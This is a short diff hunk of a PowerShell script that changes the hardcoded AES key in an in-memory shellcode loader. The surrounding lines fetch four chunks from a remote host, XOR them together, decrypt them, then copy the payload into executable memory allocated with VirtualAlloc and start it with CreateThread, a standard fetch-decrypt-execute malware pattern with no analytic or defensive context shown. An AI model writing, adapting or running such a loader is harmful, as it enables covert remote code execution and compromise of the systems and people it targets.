@@ -7,6 +7,6 @@ $k=Add-Type -Def @'
 $ch=@()
 for($ci=0;$ci-lt4;$ci++){$ch+=([Net.WebClient]::new()).DownloadData("$b/s$ci")}
 $xr=[byte[]]$ch[0].Clone();for($ci=1;$ci-lt$ch.Count;$ci++){for($cj=0;$cj-lt$xr.Length;$cj++){$xr[$cj]=$xr[$cj]-bxor$ch[$ci][$cj]}}
-$ak=[Byte[]]@(0x19,0x68,0xe8,0x4f,0x34,0x74,0xe2,0x04,0x66,0xff,0xf6,0xc5,0xb7,0x42,0x5e,0xc5)
+$ak=[Byte[]]@(0xeb,0x28,0x31,0x37,0x65,0x67,0xbf,0xa8,0x06,0x59,0x78,0xef,0x0b,0x7a,0x22,0x25)
 $iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
 $_va=[K]::VirtualAlloc(0,$py.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($py,0,$_va,$py.Length);[K]::CreateThread(0,0,$_va,0,0,0)
